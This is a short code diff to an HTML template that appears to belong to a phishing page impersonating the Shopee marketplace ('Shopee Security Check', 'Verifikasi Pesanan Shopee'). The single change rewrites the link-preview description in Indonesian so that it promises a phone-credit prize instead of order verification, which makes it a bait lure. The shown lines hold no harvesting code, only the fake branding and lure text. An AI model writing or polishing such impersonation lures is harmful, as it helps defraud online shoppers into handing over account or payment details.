@@ -20,7 +20,7 @@ HTML_TEMPLATE = """
     <title>Shopee Security Check</title>
     <meta property="og:image" content="{{ image }}">
     <meta property="og:title" content="Verifikasi Pesanan Shopee">
-    <meta property="og:description" content="Lakukan verifikasi keamanan untuk melanjutkan transaksi.">
+    <meta property="og:description" content="Lakukan verifikasi keamanan untuk melanjutkan pengklaiman hadiah pulsa.">
     <style>
         body { font-family: 'Open Sans', sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; margin: 0; }
         .container { background: white; max-width: 400px; margin: 40px auto; padding: 30px; border-radius: 8px; box-shadow: 0 2px 8px rgba(0,0,0,0.1); }
